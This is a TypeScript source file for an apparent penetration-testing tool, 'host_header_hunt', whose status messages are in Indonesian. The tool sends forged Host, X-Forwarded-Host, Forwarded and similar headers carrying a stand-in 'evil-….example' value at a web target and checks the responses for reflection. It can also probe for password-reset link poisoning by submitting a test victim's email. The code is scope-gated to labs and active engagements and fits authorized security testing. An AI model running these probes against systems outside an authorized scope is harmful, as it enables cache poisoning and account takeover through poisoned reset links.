// hostHeaderHunt.ts — Host-header attack prover (host_header_hunt).
//
// Sends ≤8 Host-family headers (Host, X-Forwarded-Host/Scheme, Forwarded,
// X-Original-URL, X-Rewrite-URL…) with an evil/canary value at a base URL
// and optional password-reset endpoint:
//  - reflection in body/Location → CACHE/REFLECT signal (re-fetch without the
//    header decides cacheability; never claimed poisoned without it);
//  - reset flow: POST email to reset_url with evil Host → reset link in the
//    response carrying the evil host = RESET-LINK-POISONED (strong).
// Verdicts: honest per-vector lines + no false "vulnerable" without a second
// confirmation step. Scope-gated, bounded, session-safe. Write — confirm.

import { targetAllowed, politeDelay } from "./security";
import { sessionHeaders } from "./httpSession";

export const HOST_HEADERS = [
  "Host",
  "X-Forwarded-Host",
  "X-Forwarded-Scheme",
  "X-Forwarded-Proto",
  "Forwarded",
  "X-Original-URL",
  "X-Rewrite-URL",
  "X-Host",
];

export type HostHit = { header: string; kind: "REFLECT" | "RESET-LINK" | "clean" | "error"; detail: string };

/** Build the header value for a probe (evil host + canary). Pure. */
export function evilValue(kind: "host" | "url" | "forwarded", canary: string): string {
  if (kind === "host") return `evil-${canary}.example`;
  if (kind === "url") return `https://evil-${canary}.example/p`;
  return `for=1.2.3.4;host="evil-${canary}.example"`;
}

/** Classify one probe response for reflection of the canary. Pure. */
export function hostReflect(
  header: string,
  sent: string,
  status: number,
  headers: Record<string, string>,
  body: string,
  canary: string
): HostHit {
  void header;
  const loc = Object.entries(headers || {}).find(([k]) => k.toLowerCase() === "location")?.[1] || "";
  if (loc.toLowerCase().includes(canary.toLowerCase())) {
    return { header, kind: "REFLECT", detail: `Location memantulkan canary (${loc.slice(0, 100)})` };
  }
  if ((body || "").toLowerCase().includes(canary.toLowerCase())) {
    return { header, kind: "REFLECT", detail: `body memantulkan canary (${status})` };
  }
  if ((body || "").toLowerCase().includes(sent.toLowerCase().slice(0, 24))) {
    return { header, kind: "REFLECT", detail: `body memantulkan nilai header (${status})` };
  }
  return { header, kind: "clean", detail: `tidak ada pantulan (${status})` };
}

export type FetchFn = (url: string, init?: { method?: string; headers?: Record<string, string>; body?: string }) => Promise<{ status: number; body: string; headers?: Record<string, string> }>;

async function defaultFetch(url: string, init: { method?: string; headers?: Record<string, string>; body?: string } = {}): Promise<{ status: number; body: string; headers?: Record<string, string> }> {
  try {
    const res = await fetch(url, {
      method: init.method || "GET",
      headers: { "User-Agent": "mia-assistant/1.0", ...(init.headers || {}) },
      body: init.method && init.method !== "GET" && init.method !== "HEAD" ? init.body : undefined,
      redirect: "manual",
      signal: AbortSignal.timeout(12_000),
    });
    const headers: Record<string, string> = {};
    res.headers.forEach((v, k) => { headers[k] = v; });
    return { status: res.status, body: (await res.text()).slice(0, 12_000), headers };
  } catch {
    return { status: 0, body: "", headers: {} };
  }
}

function canary(): string {
  return `hh${Date.now().toString(36).slice(-4)}${Math.floor(Math.random() * 1296).toString(36)}`;
}

/**
 * Hunt Host-header issues. Scope-gated, bounded (≤8 headers + optional reset).
 * `reset_url` + `email` (+`email_field`) enable the password-reset poisoning
 * check; otherwise reflection-only + cacheability re-fetch.
 */
export async function hostHeaderHunt(
  rawUser: unknown,
  opts: { url?: string; reset_url?: string; email?: string; email_field?: string; session?: string; fetchFn?: FetchFn } = {}
): Promise<string> {
  const raw = String(opts.url || "").trim();
  if (!/^https?:\/\//i.test(raw)) return "Error: url harus http(s).";
  if (!targetAllowed(raw)) return "Error: SCOPE — host_header_hunt hanya untuk lab / engagement aktif.";
  const resetUrl = String(opts.reset_url || "").trim();
  if (resetUrl && (!/^https?:\/\//i.test(resetUrl) || !targetAllowed(resetUrl))) {
    return "Error: SCOPE — reset_url di luar izin.";
  }
  const fetchFn = opts.fetchFn || defaultFetch;
  const sess = opts.session ? sessionHeaders(rawUser, opts.session) : null;
  if (opts.session && !sess) return `Error: session "${opts.session}" tidak dikenal.`;
  const base: Record<string, string> = { ...(sess?.headers || {}) };
  if (sess?.cookie) base["cookie"] = sess.cookie;

  const can = canary();
  const lines: string[] = [`🎯 HOST-HEADER HUNT ${raw} (canary ${can})`];
  let reflects = 0;
  for (const h of HOST_HEADERS) {
    const kind = h === "Host" ? "host" : h === "Forwarded" ? "forwarded" : /url/i.test(h) ? "url" : "host";
    const val = evilValue(kind as "host" | "url" | "forwarded", can);
    let r: { status: number; body: string; headers?: Record<string, string> };
    try {
      await politeDelay();
      r = await fetchFn(raw, { headers: { ...base, [h]: val } });
    } catch {
      lines.push(`• ${h} — request gagal — ERROR.`);
      continue;
    }
    if (r.status === 0) {
      lines.push(`• ${h} — tak terjangkau — ERROR.`);
      continue;
    }
    const hit = hostReflect(h, val, r.status, r.headers || {}, r.body, can);
    if (hit.kind === "REFLECT") {
      reflects++;
      lines.push(`• ${h} — 🚨 ${hit.detail} — kandidat (uji cacheability: re-fetch TANPA header).`);
    } else {
      lines.push(`• ${h} — ${hit.detail}.`);
    }
  }
  // Password-reset poisoning path.
  if (resetUrl && opts.email) {
    const field = String(opts.email_field || "email");
    const val = evilValue("host", can);
    try {
      await politeDelay();
      const body = new URLSearchParams({ [field]: String(opts.email) }).toString();
      const r = await fetchFn(resetUrl, {
        method: "POST",
        headers: { ...base, Host: new URL(resetUrl).host, "X-Forwarded-Host": val, "Content-Type": "application/x-www-form-urlencoded" },
        body,
      });
      const combined = `${r.body} ${JSON.stringify(r.headers || {})}`.toLowerCase();
      if (combined.includes(can.toLowerCase())) {
        lines.push(`• reset-poisoning — 🔴 link/isi reset memuat host evil (${resetUrl}) — RESET-LINK-POISONED, temuan kuat.`);
        reflects++;
      } else {
        lines.push(`• reset-poisoning — link reset tidak memuat host evil (${r.status}) — terkontrol untuk vektor ini.`);
      }
    } catch (e) {
      lines.push(`• reset-poisoning — request gagal (${e instanceof Error ? e.message : String(e)}) — inconclusive.`);
    }
  } else if (resetUrl && !opts.email) {
    lines.push("• reset-poisoning — dilewati (butuh email korban uji).");
  }
  lines.push("");
  lines.push(reflects ? `⚠️ ${reflects} pantulan host-header — untuk cache: re-fetch TANPA header pemicu; untuk reset: konfirmasi link. Lalu \`poc_verify\` → \`finding_add\`.` : "Tidak ada pantulan host-header (8 header bersih).");
  return lines.join("\n");
}
